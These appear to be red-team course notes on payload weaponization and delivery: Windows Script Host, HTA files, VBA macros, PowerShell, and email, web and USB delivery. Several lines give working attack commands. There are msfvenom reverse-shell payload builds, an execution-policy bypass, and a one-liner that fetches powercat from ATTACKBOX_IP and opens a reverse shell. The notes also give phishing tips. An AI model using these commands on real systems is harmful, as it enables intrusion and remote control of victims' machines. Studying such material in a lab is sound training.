## Introduction

##### What is Weaponization

In this stage the attacker develops and uses deliverable payloads for the exploit.

`.exe` files are usually blocked red teamers rely upon building custom payloads, sent with phishing campaigns for example.

## Windows Scripting Host - WSH

##### Windows Scripting Host (WSH)

WSH is a built-in Windows administration tools that runs batch files to manage and automate tasks within the OS.

It is a Windows native engine, `cscript.exe` (for command-line scripts) and `wscript.exe` (for UI scripts) that are responsible for executing various Microsoft Visual Basic Scripts (VBScript) including `vbs` and `vbe`, which runs with the permission of a regular user.

## An HTML Application - HTA

##### An HTML Application (HTA)

Allows to create a downloadable file that takes information about how it is displayed and rendered, HTAs are dynamic HTML pages containing JScript and VBScript. The LOLBINS (Living-of-the-land Binaries) tool `mshta` is used to execute HTA files, or they can be executed by themselves from Internet Explorer.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<port> -f hta-psh -o <file name>` - Create HTA reverse shell payload.

`exploit/windows/misc/hta_server` Metasploit module for delivering HTA payload.

## Visual Basic for Application - VBA

##### Visual Basic for Application (VBA)

VBA is a programming language that allows automating almost every keyboard and mouse interaction between a user and Microsoft Office applications.

Macros are Microsoft Office applications written in VBA, used to automate tasks.

view → macros - Open the Visual Basic editor from an Office app.

`Word 97-2003 Template` - Document type that supports macros.

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.50.159.15 LPORT=443 -f vba` - Generate a macro reverse shell.

## PowerShell - PSH

##### PowerShell (PSH)

Object-oriented programming language executed from the Dynamic Language Runtime in `.NET` with some exceptions for legacy uses.

`Get-ExecutionPolicy` - Determine the current Powershell execution policy.
`Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` - Change the execution policy.
`powershell -ex bypass -File thm.ps1` - Bypass the execution policy to execute a file.

`powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"` - Download and execute a payload using Powershell.

## Delivery Techniques

##### Email Delivery

The goal is to trick the victim to visit the malicious website or click and run the malicious file.

Depending on the engagement requirement phishing infrastructure requires setting up various options within the email server, including DomainKeys Identified Email (DKIM), Sender Policy Framework (SPF) and DNS Pointer (PTR) record.

The red team can use third party email services with good reputations.

Other interesting method is to use a compromised email from within the company.

##### Web Delivery

Another method is hosting malicious payload on a web server that follows the security guidelines, it can involve social engineering as well, an attacker can also use zero-day exploits on applications such as Java or web browsers to use them in web delivery or phishing techniques.

##### USB Delivery

This method requires the victim to plug in the USB, can be useful in conferences and such when the attacker can distribute the USBs. Some organizations disable USB usage.